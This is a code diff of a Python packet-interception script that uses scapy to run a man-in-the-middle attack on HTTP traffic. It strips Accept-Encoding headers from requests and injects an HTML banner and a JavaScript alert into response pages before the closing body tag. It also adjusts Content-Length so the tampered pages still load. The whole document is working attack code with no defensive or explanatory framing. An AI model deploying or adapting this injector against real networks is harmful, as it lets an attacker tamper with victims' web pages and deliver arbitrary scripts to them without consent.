@@ -22,20 +22,25 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             # HTTP request
-            # modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            modified_load = re.sub(r"Accept-Encoding:.*?\r\n", "", scapy_packet[scapy.Raw].load)
-
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
         elif scapy_packet[scapy.TCP].sport == 80:
             # HTTP response
             body = "</body>"
-            load_code = "<h1>Hacked</h1>" + body
-            modified_load = scapy_packet[scapy.Raw].load.replace(body, load_code)
-            new_packet = set_load(scapy_packet, modified_load)
+            injection_code = "<h1 style='color: red'>Hacked</h1><script>alert('Hacked');</script>"
+            load = load.replace(body, injection_code + body)
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
+
     packet.accept()
 
 
